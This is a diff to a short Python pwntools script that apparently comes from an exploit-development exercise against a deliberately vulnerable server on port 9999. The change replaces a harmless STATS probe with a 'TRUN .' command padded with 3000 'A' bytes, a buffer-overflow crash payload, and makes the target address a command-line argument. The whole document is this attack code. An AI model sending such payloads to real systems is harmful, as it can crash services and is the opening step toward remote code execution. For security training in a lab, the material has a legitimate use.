@@ -5,12 +5,15 @@ import sys
 from pwn import *
 from struct import pack
 
+# Set context level
+context.log_level = 'debug'
+
+COMMAND = b'TRUN .'
 
 buf = b""
-buf += b"STATS LMAOOO\n"
+buf += COMMAND + b" "
+buf += b'A'*3000
 
-
-buf += b"EXIT\n\n"
 
 def main():
   if len(sys.argv) != 2:
@@ -21,12 +24,16 @@ def main():
   port = 9999
   
   # Receive new line "Welcome to vulnerable server! ect."
-  conn = remote("192.168.30.128", 9999)
-  conn.recvline()
+  conn = remote(sys.argv[1], 9999)
   
-  conn.sendline(b'STATS LMAOOOO')
+  
+  s = conn.recvline()
+  
+  s = conn.sendline(buf)
+  s = conn.recvline()
   
   conn.sendline(b'EXIT')
+  conn.recvall()
 
   conn.close()
   print("[+] Packet sent")
